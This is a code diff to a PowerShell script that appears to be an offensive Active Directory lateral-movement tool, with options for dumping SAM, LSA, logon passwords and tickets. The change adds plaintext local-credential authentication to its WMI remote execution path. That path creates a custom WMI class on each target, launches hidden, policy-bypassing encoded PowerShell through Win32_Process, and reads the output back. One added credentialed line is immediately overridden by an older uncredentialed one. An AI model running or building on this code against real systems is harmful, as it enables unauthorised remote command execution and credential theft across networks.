@@ -339,7 +339,7 @@ $AccountOperators = $group.Properties["member"] | ForEach-Object {
     $user
 }
 
-
+if (!$LocalAuth){
 if ($Method -ne "RDP"){
 if (!$Force){
 foreach ($EnterpriseAdmin in $EnterpriseAdmins){
@@ -379,6 +379,8 @@ if (!$CurrentUser) {
                 Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "Specified username is not a valid domain user"
                 return
+                
+                }
             }
         }
     }
@@ -591,7 +593,7 @@ $WMIJobs = @()
     $OS = $computer.Properties["operatingSystem"][0]
     $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
-            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName, $NameLength, $OSLength, $LSA)
+            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username)
             $Class = "PMEClass"
 
     $tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
@@ -601,14 +603,23 @@ $WMIJobs = @()
 		$tcpClient.EndConnect($asyncResult)
 		$tcpClient.Close()
 
+if ($LocalAuth){
 
+$LocalUser = "$ComputerName\$Username"
+$Password = ConvertTo-SecureString "$Password" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $LocalUser, $Password
+
+}
 
 #Check access
 $ErrorActionPreference = "silentlycontinue"
 $osInfo = $null  # Reset $osInfo variable before each iteration
-$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName
 
-IF ($osinfo -and $Command -eq ""){
+if ($LocalAuth){$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -Credential $Cred}
+elseif (!$LocalAuth) {$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName}
+
+
+if ($osinfo -and $Command -eq ""){
 
             Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
             Write-Host "   " -NoNewline
@@ -634,7 +645,10 @@ IF ($osinfo -and $Command -eq ""){
 elseif ($osinfo -and $Command -ne ""){
 
     function CreateScriptInstance([string]$ComputerName) {
-        $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
+    
+if ($LocalAuth){$classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $Cred}
+elseif (!$LocalAuth) {$classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"}
+
         if ($classCheck -eq $null) {
             $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
             $newClass["__CLASS"] = "$Class"
@@ -644,7 +658,10 @@ elseif ($osinfo -and $Command -ne ""){
             $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
             $newClass.Put() | Out-Null
         }
-        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
+
+if ($LocalAuth){$wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $Cred}
+elseif (!$LocalAuth) {$wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName}
+
         $wmiInstance.GetType() | Out-Null
         $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
         $wmiInstance.Dispose()
@@ -654,7 +671,10 @@ elseif ($osinfo -and $Command -ne ""){
 
 function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
     try {
-        $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
+
+if ($LocalAuth){$wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'" -Credential $Cred}
+elseif (!$LocalAuth) {$wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"}
+        
         $result = $wmiInstance.CommandOutput
         $wmiInstance.Dispose()
         return $result
@@ -663,10 +683,12 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
     finally {if ($wmiInstance) {$wmiInstance.Dispose()}}
 }
 
-
     function ExecCommand([string]$ComputerName, [string]$Command) {
         $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
-        $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
+
+if ($LocalAuth){$process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $Cred}
+elseif (!$LocalAuth) {$process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine}
+        
         if ($process.ReturnValue -eq 0) {
             $started = Get-Date
             Do {
@@ -674,6 +696,10 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
                     Write-Host "PID: $($process.ProcessId) - Response took too long."
                     break
                 }
+
+if ($LocalAuth){$watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $Cred}
+elseif (!$LocalAuth) {$watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"}
+
                 $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                 Start-Sleep -Seconds 1
             } While ($watcher -ne $null)
@@ -690,9 +716,6 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
     $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
     $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
     $result = ExecCommand $ComputerName $encodedCommand
-
-
-
              
              $Time = (Get-Date).ToString("HH:mm:ss")
              Write-Host "WMI " -ForegroundColor "Yellow" -NoNewline
@@ -783,7 +806,7 @@ elseif (!$osinfo){
             Start-Sleep -Milliseconds 500
         }
 
-        $WMIJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName,  $NameLength, $OSLength, $LSA
+        $WMIJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName,  $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username
         [array]$WMIJobs += $WMIJob
 
         # Check if the maximum number of concurrent jobs has been reached
